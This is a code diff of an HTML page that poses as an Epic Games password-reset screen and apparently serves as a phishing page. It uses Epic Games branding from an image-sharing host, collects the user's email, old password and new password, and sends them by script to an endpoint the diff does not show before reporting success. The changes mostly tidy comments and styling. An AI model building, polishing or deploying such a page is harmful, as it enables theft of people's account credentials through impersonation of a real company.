@@ -33,7 +33,7 @@
         }
 
         .logo img {
-            width: 100px; /* Adjusted size */
+            width: 100px;
             height: auto;
         }
 
@@ -121,29 +121,6 @@
             box-shadow: 0 3px 6px rgba(0, 0, 0, 0.2);
         }
 
-        .container {
-            max-width: 400px;
-            margin: 50px auto;
-            padding: 20px;
-            background-color: #1a1a1a;
-            border-radius: 10px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
-            color: #ddd;
-        }
-
-        .logo img {
-            display: block;
-            margin: 0 auto 20px;
-            width: 150px;
-        }
-
-        .MuiTypography-root {
-            text-align: center;
-            font-size: 16px;
-            margin-bottom: 20px;
-            color: #ddd;
-        }
-
         #successMessage {
             display: none;
             text-align: center;
@@ -154,51 +131,42 @@
 </head>
 <body>
     <div class="container">
-        <!-- Logo Section -->
         <div class="logo">
             <img src="https://i.ibb.co/PTf4kjw/epic-games-logo.jpg" alt="Epic Games Logo">
         </div>
 
-        <!-- Instructions -->
         <div class="MuiTypography-root MuiTypography-body1 mui-o497ds">
             Enter your new password for your Epic Games account.
         </div>
 
-        <!-- Form Section -->
         <form id="resetForm">
-            <!-- Email Section -->
             <div class="form-group">
                 <label for="email">Email</label>
                 <input type="email" id="email" name="email" placeholder="Enter your email" required>
             </div>
 
-            <!-- Old Password Section -->
             <div class="form-group">
                 <label for="oldPassword">Old Password</label>
                 <input type="password" id="oldPassword" name="oldPassword" placeholder="Enter your old password" required>
             </div>
 
-            <!-- New Password Section -->
             <div class="form-group">
                 <label for="newPassword">New Password</label>
                 <input type="password" id="newPassword" name="newPassword" placeholder="Enter your new password" required>
             </div>
 
-            <!-- Submit Button -->
-            <button type="submit" class="submit-btn">Reset Password</button>
+            <button type="submit">Reset Password</button>
         </form>
 
-        <!-- Success message (hidden by default) -->
         <div id="successMessage">
             Password Reset Successfully!
         </div>
     </div>
 
     <script>
-        // Handle form submission with AJAX to avoid page reload
         document.getElementById('resetForm').addEventListener('submit', function(e) {
-            e.preventDefault();  // Prevent the form from submitting normally
-
+            e.preventDefault();
+            
             const email = document.getElementById('email').value;
             const oldPassword = document.getElementById('oldPassword').value;
             const newPassword = document.getElementById('newPassword').value;
@@ -214,8 +182,9 @@
             })
             .then(response => response.json())
             .then(data => {
+                console.log(data);
                 document.getElementById('successMessage').style.display = 'block';
-                document.getElementById('resetForm').reset();  // Reset form fields
+                document.getElementById('resetForm').reset(); 
             })
             .catch(error => {
                 console.error('Error:', error);
